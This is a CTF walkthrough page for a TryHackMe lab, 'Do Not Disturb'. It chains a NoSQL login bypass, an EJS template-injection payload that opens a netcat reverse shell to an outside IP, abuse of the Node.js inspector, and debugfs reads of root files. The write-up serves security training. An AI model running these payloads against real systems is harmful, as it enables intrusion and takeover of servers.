@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>do_not_disturb · hackerholidays</title>
+<meta name="description" content="CTF writeup: do_not_disturb (hackerholidays)" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@400;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/style.css" />
+<link rel="stylesheet" href="../../css/pygments.css" />
+</head>
+<body>
+<div class="blueprint-grid" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="topbar__inner">
+    <a class="topbar__brand" href="../../index.html">
+      <span class="brand-mark">CTF</span>
+      <span class="brand-text">Writeups</span>
+    </a>
+    <div class="topbar__spacer"></div>
+    <div class="topbar__actions">
+      <a class="btn btn--ghost btn--small" href="https://aaadarsh1337.github.io/">&#8592; Portfolio</a>
+      <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups" target="_blank" rel="noopener">Repo &#8599;</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<div class="reader-layout reader-layout--static">
+  <aside class="sidebar">
+    <div class="sidebar__head">
+      <a class="btn btn--ghost btn--small" href="../../index.html">&#8592; All writeups</a>
+    </div>
+    <div class="sidebar__challenge">
+      <p class="tb-label">CHALLENGE</p>
+      <h2>do_not_disturb</h2>
+      <p class="side-path">hackerholidays</p>
+    </div>
+    <div class="sidebar__files">
+      <p class="tb-label">FILES</p>
+      <div class="file-list"><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/CVE-2026-43503.c" target="_blank" rel="noopener"><span class="name">CVE-2026-43503.c</span><span class="kind">c</span></a><a class="file-item unreadable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/a.out" target="_blank" rel="noopener"><span class="name">a.out</span><span class="kind">github</span></a><a class="file-item unreadable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/basicscan" target="_blank" rel="noopener"><span class="name">basicscan</span><span class="kind">github</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/exploit.c" target="_blank" rel="noopener"><span class="name">exploit.c</span><span class="kind">c</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/exploit.sh" target="_blank" rel="noopener"><span class="name">exploit.sh</span><span class="kind">sh</span></a><a class="file-item unreadable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/fullscan" target="_blank" rel="noopener"><span class="name">fullscan</span><span class="kind">github</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/notes.md" target="_blank" rel="noopener"><span class="name">notes.md</span><span class="kind">md</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/req.txt" target="_blank" rel="noopener"><span class="name">req.txt</span><span class="kind">txt</span></a></div>
+    </div>
+    <div class="sidebar__foot">
+      <a class="btn btn--ghost btn--small sidebar-gh-btn" href="https://github.com/aaadarsh1337/ctf-writeups/tree/main/hackerholidays/do_not_disturb" target="_blank" rel="noopener">Open folder &#8599;</a>
+      <a class="btn btn--ghost btn--small sidebar-gh-btn" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/notes.md" target="_blank" rel="noopener">View markdown &#8599;</a>
+    </div>
+  </aside>
+  <article class="reader">
+    <div class="reader__toolbar">
+      <div class="reader__crumb">
+        <span class="tb-label">READING</span>
+        <span>notes.md</span>
+      </div>
+      <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/do_not_disturb/notes.md" target="_blank" rel="noopener">Source &#8599;</a>
+    </div>
+    <div class="reader__body">
+      <div class="md-render">
+<h1 id="day-7-do-not-disturb">Day 7 - Do Not Disturb</h1>
+<h2 id="room-httpstryhackmecomroomhh-donotdisturb-84a45644">Room: <a href="https://tryhackme.com/room/hh-donotdisturb-84a45644">https://tryhackme.com/room/hh-donotdisturb-84a45644</a></h2>
+<p>Hello Hackers!</p>
+<p>Welcome to Day 7 of the TryHackMe Hacker Holidays 2026 writeups.</p>
+<p>A login page is available, so we first inspect the login request using Burp Suite.</p>
+<p>The application is vulnerable to NoSQL injection. In Burp, change the request parameters to:</p>
+<div class="highlight"><pre><span></span><code>username=attendant&amp;password[$ne]=null
+</code></pre></div>
+
+<p>This bypasses the password check and logs us into the application.</p>
+<p>The application contains an EJS field that processes server-side JavaScript. We can use it to execute commands and obtain a reverse shell.</p>
+<p>The attached payload is:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;%=</span><span class="w"> </span><span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s1">'rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2&gt;&amp;1 0&lt;/tmp/b | nc 192.168.188.174 4444 1&gt;/tmp/b'</span><span class="p">)</span><span class="w"> </span><span class="cp">%&gt;</span>
+</code></pre></div>
+
+<p>After running the payload and receiving the shell, the user flag can be retrieved:</p>
+<blockquote>
+<p><code>THM{...}</code></p>
+</blockquote>
+<p>Next, we perform privilege-escalation enumeration using LinPEAS:</p>
+<div class="highlight"><pre><span></span><code>./linpeas.sh
+</code></pre></div>
+
+<p>LinPEAS reveals interesting disk access permissions and a Node.js process listening on port <code>9229</code>.</p>
+<p>We connect to the Node.js inspector:</p>
+<div class="highlight"><pre><span></span><code>node<span class="w"> </span>inspect<span class="w"> </span><span class="m">127</span>.0.0.1:9229
+</code></pre></div>
+
+<p>Enter the REPL:</p>
+<div class="highlight"><pre><span></span><code>repl
+</code></pre></div>
+
+<p>Now use the Node.js process to execute the <code>lsblk</code> command:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">process</span><span class="p">.</span><span class="nx">getBuiltinModule</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">'lsblk'</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
+</code></pre></div>
+
+<p>The output reveals the disk device:</p>
+<blockquote>
+<p><code>/dev/nvme0n1p1</code></p>
+</blockquote>
+<p>Since we have raw disk access, we can use <code>debugfs</code> to read the root flag directly from the filesystem:</p>
+<div class="highlight"><pre><span></span><code>process.getBuiltinModule<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.execSync<span class="o">(</span><span class="s1">'debugfs -R "cat /root/root.txt" /dev/nvme0n1p1'</span><span class="o">)</span>.toString<span class="o">()</span>
+</code></pre></div>
+
+<p>This reveals the root flag:</p>
+<blockquote>
+<p><code>THM{...}</code></p>
+</blockquote>
+<p>Happy Hacking!</p>
+      </div>
+    </div>
+  </article>
+</div>
+
+</main>
+</body>
+</html>
